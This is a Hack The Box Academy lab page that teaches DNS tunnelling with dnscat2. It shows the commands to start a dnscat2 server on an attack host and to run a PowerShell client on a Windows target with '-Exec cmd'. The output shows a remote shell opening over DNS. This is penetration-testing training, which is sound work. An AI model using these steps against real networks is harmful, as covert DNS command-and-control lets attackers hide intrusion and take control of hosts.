<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/158/section/1436
// Platform Version: V1
// Module ID: 158
// Module Name: Pivoting, Tunneling, and Port Forwarding
// Module Difficulty: Medium
// Section ID: 1436
// Section Title: DNS Tunneling with Dnscat2
// Page Title: Pivoting, Tunneling, and Port Forwarding
// Page Number: 12
-->

# DNS Tunneling with Dnscat2

**Module Name:** Pivoting, Tunneling, and Port Forwarding **Page Number:** 12

#### PIVOTING, TUNNELING, AND PORT FORWARDING

# DNS Tunneling with Dnscat2

## Setting Up & Using dnscat2

#### Cloning dnscat2 and Setting Up the Server

``` shell-session
[!bash!]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

#### Starting the dnscat2 server

``` shell-session
[!bash!]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

#### Cloning dnscat2-powershell to the Attack Host

``` shell-session
[!bash!]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

#### Importing dnscat2.ps1

``` powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

``` powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

#### Confirming Session Establishment

``` shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

#### Listing dnscat2 Options

``` shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

#### Interacting with the Established Session

``` shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

# 

# 

#### Questions

####